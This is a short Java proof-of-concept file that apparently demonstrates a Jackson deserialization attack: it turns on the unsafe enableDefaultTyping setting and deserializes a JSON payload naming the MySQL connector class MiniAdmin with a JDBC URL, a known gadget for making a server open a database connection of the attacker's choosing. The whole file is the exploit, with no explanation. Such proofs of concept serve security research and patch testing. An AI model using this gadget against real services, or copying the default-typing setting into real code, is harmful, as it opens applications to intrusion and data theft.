package poc;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Main {

    public static void main(String[] args){
        String payload="[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://localhost:3306/\"]";

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

